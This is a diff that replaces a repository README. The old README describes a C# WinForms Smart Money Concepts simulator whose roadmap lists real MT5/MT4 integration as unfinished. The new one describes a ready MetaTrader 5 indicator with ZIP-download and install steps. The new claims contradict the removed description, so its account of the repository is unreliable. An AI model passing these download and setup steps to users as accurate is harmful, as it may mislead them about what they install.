@@ -1,208 +1,61 @@
-<div align="center">
+# 📊 Smart-Money-Concepts-indicator-MT5 - Identify market liquidity and price trends
 
-# 🧠 Smart Money Indicator MT5/MT4
+[![](https://img.shields.io/badge/Download-Indicator-blue.svg)](https://github.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5)
 
-**Advanced Smart Money Concepts (SMC) visualization tool with real-time market structure, liquidity zones, order blocks, and institutional logic simulation. Built for precision traders.**
+This tool helps traders find key points on their charts. It works inside the MetaTrader 5 platform. The indicator tracks price action. It marks market structures, order blocks, and levels of liquidity. Traders use these patterns to plan trades. The tool runs automatically on your charts. It saves time by finding patterns for you.
 
-<br>
+## 🛠️ System Requirements
 
-![Platform](https://img.shields.io/badge/MT5%20%2F%20MT4-Compatible-00D4AA?style=for-the-badge)
-![Framework](https://img.shields.io/badge/.NET-6%2B-512BD4?style=for-the-badge)
-![UI](https://img.shields.io/badge/Desktop-WinForms-4D9FFF?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-FF4D6A?style=for-the-badge)
+You need a computer with Windows 10 or Windows 11. You must have MetaTrader 5 installed on your machine. This software follows the standard MQL5 format. It requires an active internet connection to update price data. Ensure your MetaTrader 5 platform is fully updated to the latest version from your broker. No extra programming knowledge is necessary to use this tool.
 
-</div>
+## 📥 How to download
 
----
+Visit the official repository page to download the necessary files. 
 
-## 📸 Preview
+[Click here to open the download page](https://github.com/RichyMunalula/Smart-Money-Concepts-indicator-MT5)
 
-<div align="center">
+On this page, locate the green button labeled Code. Select the option to Download ZIP. Save this file to your computer. Create a clear folder on your desktop and extract the contents of the ZIP file there. You will find a file ending in the extension .ex5 or .mq5. This is the indicator file.
 
-<p align="center">
-  <img src="https://i.ibb.co/p742wv1/x.png" alt="photo" width="820">
-</p>
+## ⚙️ Setting up the indicator
 
-</div>
+Follow these steps to add the tool to MetaTrader 5:
 
----
+1. Open your MetaTrader 5 application.
+2. Click the File menu at the top left corner.
+3. Select the option Open Data Folder.
+4. A new window showing your computer files will appear.
+5. Open the folder named MQL5.
+6. Open the folder named Indicators.
+7. Move the indicator file you extracted earlier into this folder.
+8. Close the folder window.
+9. Return to the MetaTrader 5 platform.
+10. Look at the Navigator panel on the left side of your screen.
+11. Right-click on the word Indicators.
+12. Click Refresh.
+13. You will now see the indicator name in the list.
 
-## 🎬 Demo
+## 📈 Using the tool on your charts
 
-<div align="center">
+Drag the indicator name from the Navigator panel directly onto any open price chart. A settings window will appear on your screen. You can change colors and visual styles here. Click OK to finish the process. The tool will begin to scan the chart data immediately. It will draw boxes and lines to show you order blocks and market structure.
 
-<img src="https://i.imgur.com/9GGKfBs.gif" alt="Demo">
+## 🔍 Understanding the features
 
-</div>
+Liquidity markers show where orders often wait. Order blocks highlight areas where large price moves began. The indicator marks the break of structure when price moves past a previous high or low. These visual aids help you see the market intent. You can adjust the sensitivity of the detection in the settings menu. Higher sensitivity shows more patterns. Lower sensitivity keeps your charts clear of clutter.
 
----
+## 📝 Troubleshooting common issues
 
-## 🎯 What is Smart Money Concept?
+If you do not see the indicator on your chart, check the following points:
 
-Smart Money Concept (SMC) is a trading methodology focused on **institutional behavior** rather than retail indicators.
+1. Enable Algo Trading from the top menu bar in MetaTrader 5. The button must be green.
+2. Ensure you placed the file in the Indicators folder and not elsewhere.
+3. Restart MetaTrader 5 if the indicator does not appear in the Navigator list after a refresh.
+4. Check if your broker blocks custom indicators. Most brokers allow them without issue.
+5. Ensure the file extension is .ex5. 
 
-It includes:
-- Market structure (HH, HL, LH, LL)
-- Liquidity zones
-- Order Blocks (OB)
-- Break of Structure (BOS)
-- Change of Character (CHoCH)
-- Fair Value Gaps (FVG)
+## ⚖️ Trading risk notice
 
-This project visualizes all of these in a **clean, modern trading interface**.
+Trading financial markets carries risk. This indicator provides visual data. It does not mean you will win every trade. Use this tool as a part of your own analysis process. Do not rely solely on automated indicators to make decisions. Always test your strategy on a demo account before risking money. Manage your position sizes carefully. Market conditions change often. History does not guarantee future results. 
 
----
+## 🏢 Support and updates
 
-## ⚙️ What This App Does
-
-| Module | Description |
-|------|-------------|
-| Market Structure Engine | Detects BOS / CHoCH |
-| Order Block Detection | Bullish & Bearish OB zones |
-| Liquidity Mapping | Buy-side / Sell-side liquidity |
-| FVG Detection | Imbalance zones |
-| Live Chart Engine | Custom-rendered candlestick chart |
-| Zone Tracker | Tracks active & swept zones |
-| UI Dashboard | Institutional-style trading panel |
-
----
-
-## 🚀 Features
-
-| Feature | Description |
-|--------|------------|
-| 📊 Real-Time Chart | Smooth custom candlestick rendering |
-| 🧠 Smart Money Logic | BOS, OB, Liquidity, FVG |
-| 🎯 Premium/Discount Zones | Equilibrium-based visualization |
-| ⚡ Live Price Feed | Simulated real-time ticks |
-| 🎛 Toggle System | Enable/disable SMC components |
-| 📋 Zone Table | Full zone tracking system |
-| 🎨 Modern UI | Dark institutional trading theme |
-| 🔄 Dynamic Updates | Auto-refreshing structure & price |
-
----
-
-## 🧠 Smart Money Elements
-
-### 🔹 Order Blocks (OB)
-- Institutional accumulation zones  
-- Bullish & Bearish detection  
-- Highlighted directly on chart  
-
-### 🔹 Break of Structure (BOS)
-- Confirms trend continuation  
-- Visual dashed lines  
-
-### 🔹 Liquidity Zones
-- Buy-side & sell-side liquidity  
-- Swept vs intact tracking  
-
-### 🔹 Fair Value Gap (FVG)
-- Market imbalance detection  
-- Highlighted inefficiency zones  
-
----
-
-## 📊 Interface Overview
-
-```
-[ Premium Zone ]
-██████████████
-
------- Price ------
-
-██████████████
-[ Discount Zone ]
-```
-
-- 🟢 Green → Bullish zones  
-- 🔴 Red → Bearish zones  
-- 🟡 Gold → Liquidity  
-- 🔵 Blue → FVG  
-
----
-
-## 🧩 System Behavior
-
-- Fully offline simulation (no API required)  
-- Real-time UI rendering  
-- Dynamic zone updates  
-- Smart filtering (BOS / OB / LIQ / FVG)  
-- Lightweight and fast  
-
----
-
-## 🖥️ Tech Stack
-
-- C# (.NET 6+)
-- Windows Forms (Custom UI rendering)
-- GDI+ Graphics Engine
-- Real-time simulation engine
-
----
-
-## ⚡ Quick Start
-
-**Requirements:**
-- Windows 10 / 11  
-- .NET 6+  
-- Visual Studio 2022  
-
-```bash
-git clone https://github.com/your-username/smart-money-indicator.git
-```
-
-Open solution → Press **F5**
-
----
-
-## 🧪 How to Use
-
-1. Launch application  
-2. Select trading pair (EURUSD, XAUUSD, etc.)  
-3. Choose timeframe (M5 → D1)  
-4. Enable/disable SMC components  
-5. Monitor:
-   - Market structure  
-   - Zones  
-   - Liquidity  
-6. Analyze price behavior  
-
----
-
-## 📈 Roadmap
-
-- [x] Market structure visualization  
-- [x] Order block detection  
-- [x] Liquidity mapping  
-- [x] FVG zones  
-- [ ] Real MT5/MT4 integration  
-- [ ] Strategy builder  
-- [ ] Alerts system  
-- [ ] Multi-chart support  
-
----
-
-## 🤝 Contributing
-
-```bash
-1. Fork the repo
-2. Create your branch (feature/your-feature)
-3. Commit changes
-4. Push to branch
-5. Open Pull Request
-```
-
----
-
-## 📄 License
-
-MIT License
-
----
-
-<div align="center">
-
-Smart Money Indicator · SMC Engine v2.0
-
-</div>
+This project stays open for community use. Check the GitHub page for updates. Often, developers improve the accuracy of the detection patterns. If you find a bug, report it on the GitHub issues tab. Clear reports help the developers fix problems faster. Include a screenshot if the tool behaves in an unexpected way. Follow the repository to receive notifications about new versions.
